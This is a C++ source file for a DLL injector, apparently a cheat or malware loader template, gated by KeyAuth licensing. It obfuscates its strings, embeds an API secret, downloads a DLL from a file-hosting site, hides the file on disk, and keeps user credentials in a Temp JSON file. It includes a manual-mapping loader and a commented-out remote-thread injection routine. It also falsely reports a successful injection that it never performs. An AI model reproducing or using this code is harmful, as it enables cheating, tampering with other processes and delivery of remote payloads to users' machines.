
/*

this is a simple dll injector that uses the keyauth api to login and inject a dll into a process
most used for game cheats, malware and other stuff,
this code is a template, you can change the code to your needs

coded by juve/tosted (https://github.com/zjuvee)

use at your own risk, im not responsible for any damage caused in your system or personal data

credits: 

auth system: https://github.com/KeyAuth/KeyAuth-CPP-Example / https://keyauth.cc/

dll injection system: https://guidedhacking.com/ 

*/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "auth/auth.hpp"
#include <string>
#include "auth\skStr.h"
#include <filesystem>
#include <chrono>
#include <thread>
#include <locale>
#include <codecvt>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include <string>
#include "auth/utils.hpp"
#include "xorstr.hpp"
#include <vector>
#include <Windows.h>
#include <TlHelp32.h>
#include "iostream"
//#include "Injector.h"



using namespace std;

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "winmm.lib")

//===================       KeyAuth things       =========================//

std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);
const std::string compilation_date = (std::string)skCrypt(__DATE__);
const std::string compilation_time = (std::string)skCrypt(__TIME__);

using namespace KeyAuth;

std::string name = skCrypt("VIP").decrypt();
std::string ownerid = skCrypt("bIIRsaoslQ").decrypt();
std::string secret = skCrypt("d9822c0d76785ac100b6255550e65cf30789fd316e6cd32c1a11856104962b22").decrypt();
std::string version = skCrypt("6.7").decrypt();
std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting
std::string path = skCrypt("").decrypt();

api KeyAuthApp(name, ownerid, secret, version, url, path);

using namespace std;

std::vector<DWORD> PidList;
DWORD FindProcessId(wchar_t* ProcessName) {
    PidList.clear();
    PROCESSENTRY32 Processes;
    Processes.dwSize = sizeof(Processes);
    HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(Snapshot, &Processes);
    do {
        if (!wcscmp(ProcessName, (const wchar_t*)Processes.szExeFile)) {
            PidList.push_back(Processes.th32ProcessID);
        }
    } while (Process32Next(Snapshot, &Processes));
    CloseHandle(Snapshot);
    return PidList[PidList.size() - 1];
}

DWORD GetProcPID(std::string szProc)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    PROCESSENTRY32 ProcEntry;
    ProcEntry.dwSize = sizeof(ProcEntry);

    DWORD dwReturned = -1;

    Process32First(hSnapshot, &ProcEntry);

    do
    {

        if (!strcmp(ProcEntry.szExeFile, szProc.c_str()))
        {
            dwReturned = ProcEntry.th32ProcessID;
        }

    } while (Process32Next(hSnapshot, &ProcEntry));

    CloseHandle(hSnapshot);
    return dwReturned;
}

typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);

struct loaderdata
{
    LPVOID ImageBase;

    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseReloc;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

    pLoadLibraryA fnLoadLibraryA;
    pGetProcAddress fnGetProcAddress;

};

DWORD __stdcall LibraryLoader(LPVOID Memory)
{

    loaderdata* LoaderParams = (loaderdata*)Memory;

    PIMAGE_BASE_RELOCATION pIBR = LoaderParams->BaseReloc;

    DWORD64 delta = (DWORD64)((LPBYTE)LoaderParams->ImageBase - LoaderParams->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta

    while (pIBR->VirtualAddress)
    {
        if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
        {
            int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(DWORD);// WARNING EDDITED FROM WORD
            PWORD list = (PWORD)(pIBR + 1);

            for (int i = 0; i < count; i++)
            {
                if (list[i])
                {
                    PDWORD ptr = (PDWORD)((LPBYTE)LoaderParams->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
                    *ptr += delta;
                }
            }
        }

        pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
    }

    PIMAGE_IMPORT_DESCRIPTOR pIID = LoaderParams->ImportDirectory;

    // Resolve DLL imports
    while (pIID->Characteristics)
    {
        PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->OriginalFirstThunk);
        PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->FirstThunk);

        HMODULE hModule = LoaderParams->fnLoadLibraryA((LPCSTR)LoaderParams->ImageBase + pIID->Name);

        if (!hModule)
            return FALSE;

        while (OrigFirstThunk->u1.AddressOfData)
        {
            if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                // Import by ordinal
                DWORD64 Function = (DWORD64)LoaderParams->fnGetProcAddress(hModule,
                    (LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

                if (!Function)
                    return FALSE;

                FirstThunk->u1.Function = Function;
            }
            else
            {
                // Import by name
                PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)LoaderParams->ImageBase + OrigFirstThunk->u1.AddressOfData);
                DWORD64 Function = (DWORD64)LoaderParams->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);
                if (!Function)
                    return FALSE;

                FirstThunk->u1.Function = Function;
            }
            OrigFirstThunk++;
            FirstThunk++;
        }
        pIID++;
    }

    if (LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint)
    {
        dllmain EntryPoint = (dllmain)((LPBYTE)LoaderParams->ImageBase + LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint);

        return EntryPoint((HMODULE)LoaderParams->ImageBase, DLL_PROCESS_ATTACH, NULL); // Call the entry point
    }
    return TRUE;
}

char* getDllName() {
    WIN32_FIND_DATAA file;
    //LPWIN32_FIND_DATAA file = NULL;
    HANDLE search_handle = FindFirstFileA("C:\\Users\\USER\\Videos\\Captures\\tiqqts.dll", &file);
    do
    {
        for (int i = 0; i < 25; i++) {
            if (file.cFileName[i] == '\0') {
                if (file.cFileName[i - 1] == 'l') {
                    if (file.cFileName[i - 2] == 'l') {
                        if (file.cFileName[i - 3] == 'd') {
                            if (file.cFileName[i - 4] == '.') {
                                //std::wcout << "Dll Name: " << file.cFileName << std::endl;
                                return file.cFileName;
                            }
                        }
                    }
                }
                continue;
            }
        }
    } while (FindNextFileA(search_handle, &file) != 0);
    FindClose(search_handle);
    return 0;
}

DWORD __stdcall stub()
{
    return 0;
}


//=================== convert string to wstring =========================//

std::wstring StringToWString(const std::string& str) {
    int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(length, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], length);
    return wstr;
}

//===================        DownloadFile       =========================//

HRESULT DownloadFile(const std::wstring& url, const std::wstring& filePath) {
    HRESULT hr = URLDownloadToFileW(
        NULL,                       
        url.c_str(),                
        filePath.c_str(),           
        0,                          
        NULL                        
    );

    if (SUCCEEDED(hr)) {
        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    return hr;
}

//===================      get user path        =========================//

std::string getUserName() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserName(username, &username_len)) {
        return std::string(username);
    }
    return "";
}



//===================   generate random name   ========================//

std::string generateRandomName() {
    std::string name;
    srand(time(0));

    for (int i = 0; i < 10; ++i) {
        if (i % 2 == 0) {
            char c = 'a' + rand() % 26;
            name += c;
        }
        else {
            char c = 'A' + rand() % 26;
            name += c;
        }
    }
    return name;
}


//===================      cmd text color      =========================//
void setcolor(unsigned short color)
{
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
}



//===================          HEADER          =========================//
void header()
{
    std::cout << (xorstr_("                    __  ___________    ____  __________ ")) << std::endl;
    std::cout << (xorstr_("                   / / / / ____/   |  / __ \\/ ____/ __ \\")) << std::endl;
    std::cout << (xorstr_("                  / /_/ / __/ / /| | / / / / __/ / /_/ /")) << std::endl;
    std::cout << (xorstr_("                 / __  / /___/ ___ |/ /_/ / /___/ _, _/ ")) << std::endl;
    std::cout << (xorstr_("                /_/ /_/_____/_/  |_/_____/_____/_/ |_|  ")) << std::endl;
    std::cout << (xorstr_("                                                   ")) << std::endl;
    std::cout << (xorstr_("                                               dsc.gg/example")) << std::endl;

}

//===================           AUTH           =========================//
int auth()
{
    bool asd = false;

    std::string consoleTitle = generateRandomName();
    name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();
    SetConsoleTitleA(consoleTitle.c_str());
    setcolor(4);
    KeyAuthApp.init();
    if (!KeyAuthApp.response.success)
    {
        exit(1);
    }

    if (std::filesystem::exists(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"))) // change to your .json autologin path
    {
        if (!CheckIfJsonKeyExists((xorstr_("C:\\Windows\\Temp\\fnDNerucF.json")), (xorstr_("username"))))
        {
            std::string key = ReadFromJson(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"), (xorstr_("license")));
            KeyAuthApp.license(key);
            if (!KeyAuthApp.response.success)
            {
                std::remove(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"));

                Sleep(1500);
                exit(1);
            }
            header();
            std::cout << skCrypt("[+] automatically logged !\n");
            Sleep(2000);
        }
        else
        {
            std::string username = ReadFromJson((xorstr_("C:\\Windows\\Temp\\fnDNerucF.json")), (xorstr_("username")));
            std::string password = ReadFromJson((xorstr_("C:\\Windows\\Temp\\fnDNerucF.json")), (xorstr_("password")));
            KeyAuthApp.login(username, password);
            if (!KeyAuthApp.response.success)
            {
                std::remove(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"));

                Sleep(1500);
                exit(1);
            }
            header();
            std::cout << skCrypt("[+] automatically logged !\n");
            Sleep(2000);
        }
    }
    else
    {

        header();

        std::cout << skCrypt("\n\n [1] Login\n\n [2] Register\n\n Choose an option: ");

        int option;
        std::string username;
        std::string password;
        std::string key;

        std::cin >> option;
        switch (option)
        {
        case 1:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter password: ");
            std::cin >> password;
            KeyAuthApp.login(username, password);
            break;
        case 2:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter password: ");
            std::cin >> password;
            std::cout << skCrypt("\n Enter license: ");
            std::cin >> key;
            KeyAuthApp.regstr(username, password, key);
            break;
        default:

            Sleep(3000);
            exit(1);
        }

        if (!KeyAuthApp.response.success)
        {

            Sleep(1500);
            exit(1);
        }
        if (username.empty() || password.empty())
        {
            WriteToJson(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"), (xorstr_("license")), key, false, "", "");

        }
        else
        {
            WriteToJson(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"), (xorstr_("username")), username, true, (xorstr_("password")), password);

        }


    }

    for (int i = 0; i < KeyAuthApp.user_data.subscriptions.size(); i++) {
        auto sub = KeyAuthApp.user_data.subscriptions.at(i);
        std::cout << skCrypt("\n name: ") << sub.name;
        std::cout << skCrypt(" : expiry: ") << tm_to_readable_time(timet_to_tm(string_to_timet(sub.expiry)));
        Sleep(2000);
    }

    return 0;
}

std::string tm_to_readable_time(tm ctx) {
    char buffer[80];

    strftime(buffer, sizeof(buffer), (xorstr_("%a %m/%d/%y %H:%M:%S %Z")), &ctx);

    return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
    auto cv = strtol(timestamp.c_str(), NULL, 10); // long

    return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
    std::tm context;

    localtime_s(&context, &timestamp);

    return context;
}

// obtener proc id
DWORD GetProcId(const char* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

// 
int main(int argc, char* argv[]) {

    //=================================
        // init url and filepath and set the folder path to the dll file

    std::string url = (xorstr_("https://files.catbox.moe/tiqqts.dll")); // URL del archivo a descargar
    std::string filePath = (xorstr_("C:\\Users\\USER\\Videos\\Captures\\tiqqts.dll"));

    // set the console size
    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);
    MoveWindow(console, r.left, r.top, 610, 385, TRUE);
    const char* dllPath = (xorstr_("C:\\Users\\USER\\Videos\\Captures\\tiqqts.dll"));
    const char* procName = (xorstr_("MAT.exe"));
    //DWORD ProcessId = FindProcessId(xorstr_("MAT.exe"));
    const char* ProcName = "MAT.exe";
    const char* DllURL = "https://files.catbox.moe/tiqqts.dll";
    DWORD procId = 0;

    // random name for the console
    std::string consoleTitle = generateRandomName();
    SetConsoleTitleA(consoleTitle.c_str());

    // auth moment
    auth();
    system((xorstr_("cls")));
    
    //=================================
        // download dll
    std::wstring wUrl = StringToWString(url);
    std::wstring wFilePath = StringToWString(filePath);
    
    HRESULT result = DownloadFile(wUrl, wFilePath);

    
    //=================================

    printf(xorstr_("[+] looking for the process...\n"));
    Sleep(2000);
    printf(xorstr_("[+] injecting...\n"));

    //char* Dll = getDllName();
    //std::wcout << "Dll Name: " << Dll << std::endl;

    //char* targExeNameOnly = strrchr(argv[0], '\\') + 2;
    //std::cout << "Target Exe: " << targExeNameOnly << std::endl;

    //size_t length = strlen(targExeNameOnly);
    //WCHAR targExeNameOnly_wchar[30];
    //mbstowcs_s(&length, targExeNameOnly_wchar, targExeNameOnly, length);

    //DWORD ProcessId = FindProcessId(targExeNameOnly_wchar);
    //std::cout << "Got Process id : " << ProcessId << std::endl;

    //loaderdata LoaderParams;

    //HANDLE hFile = CreateFileA((LPCSTR)Dll, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
    //    OPEN_EXISTING, 0, NULL); // Open the DLL

    //DWORD FileSize = GetFileSize(hFile, NULL);
    //PVOID FileBuffer = VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //// Read the DLL
    //ReadFile(hFile, FileBuffer, FileSize, NULL, NULL);

    //// Target Dll's DOS Header
    //PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
    //// Target Dll's NT Headers
    //PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);

    //// Opening target process.
    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
    //if (hProcess == NULL) {
    //    std::cout << "cant open process Run As Admin" << std::endl; return -1;
    //}
    //std::cout << "opend Process: " << hProcess << std::endl;

    //// Allocating memory for the DLL
    //PVOID ExecutableImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
    //    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //// Copy the headers to target process
    //WriteProcessMemory(hProcess, ExecutableImage, FileBuffer,
    //    pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    //// Target Dll's Section Header
    //PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
    //// Copying sections of the dll to the target process
    //for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    //{
    //    WriteProcessMemory(hProcess, (PVOID)((LPBYTE)ExecutableImage + pSectHeader[i].VirtualAddress),
    //        (PVOID)((LPBYTE)FileBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
    //}

    //// Allocating memory for the loader code.
    //PVOID LoaderMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
    //    PAGE_EXECUTE_READWRITE); // Allocate memory for the loader code

    //LoaderParams.ImageBase = ExecutableImage;
    //LoaderParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)ExecutableImage + pDosHeader->e_lfanew);

    //LoaderParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)ExecutableImage
    //    + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    //LoaderParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ExecutableImage
    //    + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    //LoaderParams.fnLoadLibraryA = LoadLibraryA;
    //LoaderParams.fnGetProcAddress = GetProcAddress;

    //// Write the loader information to target process
    //WriteProcessMemory(hProcess, LoaderMemory, &LoaderParams, sizeof(loaderdata),
    //    NULL);
    //// Write the loader code to target process
    //WriteProcessMemory(hProcess, (PVOID)((loaderdata*)LoaderMemory + 1), LibraryLoader,
    //    (DWORD64)stub - (DWORD64)LibraryLoader, NULL);
    //// Create a remote thread to execute the loader code
    //HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderdata*)LoaderMemory + 1),
    //    LoaderMemory, 0, NULL);

    ////std::cout << "Address of Loader: " << std::hex << LoaderMemory << std::endl;
    ////std::cout << "Address of Image: " << std::hex << ExecutableImage << std::endl;

    //// Wait for the loader to finish executing
    ////WaitForSingleObject(hThread, 1);//INFANET


    //CloseHandle(hThread);//
    ////std::cin.get();

    //// free the allocated loader code
    //VirtualFree(FileBuffer, 0, MEM_RELEASE);//
    //CloseHandle(hProcess);//
    //CloseHandle(hFile);//
    //VirtualFreeEx(hProcess, LoaderMemory, 0, MEM_RELEASE);
 
    //std::cout << SUCCESS << "Done! Your program should start now..." << std::endl;


    
    //face_injecor_v2(("AttackOnline 2.0"), (L"C:\\Users\\USER\\Videos\\Captures\\tiqqts.dll"));
    //=================================
        // inject dll 
    //while (!procId)
    //{
    //    procId = GetProcId(procName);
    //    Sleep(30);
    //}



    //HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

    //if (hProc && hProc != INVALID_HANDLE_VALUE)
    //{
    //    void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //    if (loc)
    //    {
    //        //WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
    //    }

    //    HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

    //    if (hThread)
    //    {
    //        CloseHandle(hThread);
    //    }

    //}

    //if (hProc)
    //{
    //    CloseHandle(hProc);
    //}
    
    Sleep(1000);
    printf(xorstr_("[+] successfully injected!, closing in 5 seconds..."));
    Sleep(5000);
    
    return 0;
}